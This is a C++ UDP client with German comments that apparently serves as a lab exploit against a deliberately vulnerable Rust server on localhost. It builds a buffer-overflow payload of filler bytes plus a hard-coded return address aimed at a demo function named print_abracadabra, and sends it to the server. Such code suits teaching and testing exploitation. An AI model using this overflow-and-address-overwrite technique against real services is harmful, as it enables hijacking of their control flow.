#include <arpa/inet.h>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 1234

//----------------------------------Übergabeparameter---------------------------------------
/*
 * Dem Programm muss die Offset größe übergeben werden.
 */
//----------------------------------Szenario------------------------------------------
/*
 * UDP-Kommunikation zwischen einem Server und einem Client
 * Dieses Szenario zeigt die Implementierung eines UDP-Servers in Rust und eines
 * zugehörigen Clients in C++.
 * Der Server hört auf Port 1234 und empfängt Nachrichten von Clients.
 * Der Client sendet Daten an die IP-Adresse 127.0.0.1 (localhost) auf demselben
 * Port.
 *
 *
 * Die Funktion `vulnerable_function` im Server implementiert ein unsicheres
 * Verhalten indem sie Daten ohne Längenprüfung kopiert. Dies könnte zu einem
 * Buffer Overflow und möglichen Sicherheitslücken führen.
 *
 * Der Client kann genutzt werden, um diese Schwachstelle zu testen oder zu
 * missbrauchen indem übergroße Daten gesendet werden.
 */

//----------------------------------Ablauf------------------------------------------
/*
 * Der Server wird gestartet und hört auf Port 1234.
 * Der Client verbindet sich mit dem Server und sendet Daten.
 * Abhängig von der Größe der gesendeten Daten kann der Server ein Fehlverhalten
 * zeigen, wenn die Sicherheitslücke ausgenutzt wird.
 */

int main(int argc, char *argv[]) {
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    perror("Socket erstellen fehlgeschlagen");
    return 1;
  }

  // Server-Adresse konfigurieren
  sockaddr_in server_addr = {};
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

  // Konvertierung der Eingabe
  auto PAYLOAD_OFFSET_SIZE = std::strtoul(argv[1], nullptr, 10);

  // Erstellt den Payload-Puffer mit der angegebenen Größe
  char payload[PAYLOAD_OFFSET_SIZE + 8];

  // Füllt den Payload mit A's
  std::memset(payload, 'A', PAYLOAD_OFFSET_SIZE);

  // Fügt die Zieladresse für den Exploit in den Payload ein
  uintptr_t func_addr = 0x55555555d8a0; // Adresse von print_abracadabra
  *(uintptr_t *)(payload + PAYLOAD_OFFSET_SIZE) = func_addr;

  // Debug-Ausgabe der gesendeten Adresse
  std::cout << "[DEBUG] Vollständiger Payload vor dem Senden:" << std::endl;
  for (size_t i = 0; i < PAYLOAD_OFFSET_SIZE + 8; i++) {
    std::printf("%02x ", (unsigned char)payload[i]);
  }
  std::cout << std::endl;

  // Sendet den Payload an den Server
  sendto(sockfd, payload, PAYLOAD_OFFSET_SIZE + 8, 0,
         (struct sockaddr *)&server_addr, sizeof(server_addr));

  std::cout << "[INFO] Payload gesendet!" << std::endl;
  // Schließt den Socket nach der Übertragung
  close(sockfd);
  return 0;
}
